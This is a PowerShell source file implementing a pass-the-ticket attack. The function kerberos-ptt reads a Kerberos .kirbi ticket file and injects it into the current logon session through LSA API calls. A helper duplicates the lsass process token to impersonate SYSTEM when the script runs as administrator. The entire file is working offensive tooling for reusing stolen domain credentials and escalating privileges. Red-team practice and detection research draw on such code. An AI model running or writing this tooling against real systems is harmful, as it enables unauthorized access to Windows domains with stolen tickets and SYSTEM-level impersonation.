#Recieve kerberos kirbi file and inject it into your memory
Function kerberos-ptt($filepath)
{   
    $ptt = @"
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public UInt32 LowPart;
        public Int32 HighPart;
    }

    public enum KERB_PROTOCOL_MESSAGE_TYPE 
    {
      KerbDebugRequestMessage,
      KerbQueryTicketCacheMessage,
      KerbChangeMachinePasswordMessage,
      KerbVerifyPacMessage,
      KerbRetrieveTicketMessage,
      KerbUpdateAddressesMessage,
      KerbPurgeTicketCacheMessage,
      KerbChangePasswordMessage,
      KerbRetrieveEncodedTicketMessage,
      KerbDecryptDataMessage,
      KerbAddBindingCacheEntryMessage,
      KerbSetPasswordMessage,
      KerbSetPasswordExMessage,
      KerbVerifyCredentialMessage,
      KerbQueryTicketCacheExMessage,
      KerbPurgeTicketCacheExMessage,
      KerbRefreshSmartcardCredentialsMessage,
      KerbAddExtraCredentialsMessage,
      KerbQuerySupplementalCredentialsMessage,
      KerbTransferCredentialsMessage,
      KerbQueryTicketCacheEx2Message,
      KerbSubmitTicketMessage,
      KerbAddExtraCredentialsExMessage
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY32
    {
        public int KeyType;
        public int Length;
        public int Offset;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_SUBMIT_TKT_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID                       LogonId;
        public int                        Flags;
        public KERB_CRYPTO_KEY32          Key;
        public int                        KerbCredSize;
        public int                        KerbCredOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING_IN
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr buffer;
    }

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaLookupAuthenticationPackage([In] IntPtr LsaHandle,[In] ref LSA_STRING_IN PackageName,[Out] out UInt32 AuthenticationPackage);

    [DllImport("Secur32.dll", SetLastError = true)]
    public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle,uint AuthenticationPackage,IntPtr ProtocolSubmitBuffer,int SubmitBufferLength,out IntPtr ProtocolReturnBuffer,out ulong ReturnBufferLength,out int ProtocolStatus);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaRegisterLogonProcess(LSA_STRING_IN LogonProcessName,out IntPtr LsaHandle,out ulong SecurityMode);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaConnectUntrusted([Out] out IntPtr LsaHandle);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaDeregisterLogonProcess([In] IntPtr LsaHandle); 
"@

    #Impersonating your current token to the Id of the process your specified(default is System)
    Function token-elevate($id=(Get-Process -Name lsass).Id)
    {
        $elevate = @"
        public enum SECURITY_IMPERSONATION_LEVEL 
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE 
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType,out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError=true)] 
        [return: MarshalAs(UnmanagedType.Bool)] 
        public static extern bool SetThreadToken(IntPtr PHThread,IntPtr Token);
    
        [DllImport("advapi32.dll", SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle,UInt32 DesiredAccess, out IntPtr TokenHandle);
"@

        
        Add-Type -MemberDefinition $elevate -Namespace "token" -Name "elevate"
    
        $TOKEN_IMPERSONATE = 4
        $TOKEN_DUPLICATE = 2
        $TOKEN_QUERY = 8

        #Open handle to the token of the process, duplicate it and set the current thread token to the one of the process.
        Function TokenImpersonate($id)
        {
            $process = Get-Process -Id $id
            $hToken = New-Object System.IntPtr
            [token.elevate]::OpenProcessToken($process.Handle,$TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE,[ref]$hToken)|Out-Null

            $DupToken = New-Object System.IntPtr
            [token.elevate]::DuplicateTokenEx($hToken,$TOKEN_QUERY -bor $TOKEN_IMPERSONATE,[intptr]::Zero,[token.elevate+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation,[token.elevate+TOKEN_TYPE]::TokenImpersonation,[ref]$DupToken)|Out-Null
            [token.elevate]::SetThreadToken([IntPtr]::Zero,$DupToken)|Out-Null
        }

        $prid = (Get-Process -Name lsass).Id
        if($id -eq $prid){TokenImpersonate $prid}
        else{TokenImpersonate $prid ; TokenImpersonate $id}
    }


    #Check if you are running as admin
    Function RunningAsAdmin()
    {
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $princ = New-Object System.Security.Principal.WindowsPrincipal($user)
        if($princ.IsInRole("Administrators")){return $true}
        else{return $false}
    }

    
    #Get Lsa Handle to enumerate all users
    Function LsaRegisterLogonProcess()
    {
       $logonProcessName = "User32LogonProcess"
       $LSAString = new-object kerberos.ptt+LSA_STRING_IN
       $lsaHandle = New-Object System.IntPtr
       [System.UInt64]$SecurityMode = 0

       $LSAString.Length = [System.UInt16]$logonProcessName.Length
       $LSAString.MaximumLength = [System.UInt16]($logonProcessName.Length + 1)
       $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($logonProcessName)

       $ret = [kerberos.ptt]::LsaRegisterLogonProcess($LSAString,[ref]$lsaHandle,[ref]$SecurityMode)

       return $lsaHandle
    }

    #Get lsa handle based on your privileges
    Function GetLsaHandle()
    {
        $lsahandle = New-Object System.IntPtr
        if(!(RunningAsAdmin))
        {
            Write-Host "`n[x] You Are Not Running As Admin" -ForegroundColor Red
            [int]$retcode = [kerberos.ptt]::LsaConnectUntrusted([ref]$lsahandle)
        }

        else
        {
            #token-elevate impoersonate you to be System
            if(!([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM")){token-elevate|Out-Null}
            $lsahandle = LsaRegisterLogonProcess
        }
        return $lsahandle
    }


    #returning the current luid
    Function GetCurrentLuid()
    {
        $output = klist
        return $output.split("`n")[1].split(":")[1]
    }


    #Recieve TicketBytes and Luid and inject the ticket in this logon id 
    Function ImportTicket([byte[]]$ticket,[kerberos.ptt+LUID]$luid = (New-Object kerberos.ptt+LUID))
    {
        $protocolReturnBuffer = New-Object System.IntPtr
        $ReturnBufferLength = New-Object System.Int32
        $ProtocolStatus = New-Object System.Int32

        $request = New-Object kerberos.ptt+KERB_SUBMIT_TKT_REQUEST
        $requestType = $request.getType()
        $request.MessageType = [kerberos.ptt+KERB_PROTOCOL_MESSAGE_TYPE]::KerbSubmitTicketMessage
        $request.KerbCredSize = $ticket.Length
        $request.KerbCredOffset = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$requestType)
        $request.LogonId = $luid

        $inputBufferSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$requestType) + $ticket.Length
        $inputBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($inputBufferSize)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($request,$inputBuffer,$false)
        [System.IntPtr]$PtrToCred = $inputBuffer.ToInt64() + $request.KerbCredOffset
        [System.Runtime.InteropServices.Marshal]::Copy($ticket,0,$PtrToCred,$ticket.Length)
    
        $ntstatus = [kerberos.ptt]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$inputBuffer,$inputBufferSize,[ref]$protocolReturnBuffer,[ref]$ReturnBufferLength,[ref]$ProtocolStatus)
        if(($ProtocolStatus -ne 0) -or ($ntstatus -ne 0))
        {
            Write-Host "[x]Error in LsaCallAuthenticationPackage" -ForegroundColor Red
        }

        if($inputBuffer -ne [System.IntPtr]::Zero)
        {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($inputBuffer)
            [System.Object]$ticket = $null
        }
    }

    #Main Function start HERE!!!
    $assemblies = [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal")
    Add-Type -MemberDefinition $ptt -Namespace "kerberos" -Name "ptt" -ReferencedAssemblies $assemblies.location -UsingNamespace System.Security.Principal

    $lsahandle = GetLsaHandle

    $retcode = New-Object System.Int32
    $authPackage = New-Object System.Int32
    $name = "kerberos"


    $LSAString = New-Object kerberos.ptt+LSA_STRING_IN
    $LSAString.Length = [uint16]$name.Length
    $LSAString.MaximumLength = [uint16]($name.Length + 1)
    $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($name)
    $retcode = [kerberos.ptt]::LsaLookupAuthenticationPackage($lsaHandle,[ref]$LSAString,[ref]$authPackage)

    $ticket = [System.IO.File]::ReadAllBytes($filepath)

    $strluid = GetCurrentLuid
    $intluid = [convert]::ToInt32($strluid,16)
    $luid = New-Object kerberos.ptt+LUID
    $luid.LowPart = $intluid

    ImportTicket $ticket $luid

    [kerberos.ptt]::LsaDeregisterLogonProcess($lsaHandle)|Out-Null
    
    if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){[token.elevate]::SetThreadToken([System.IntPtr]::Zero,[System.IntPtr]::Zero)|Out-Null}

}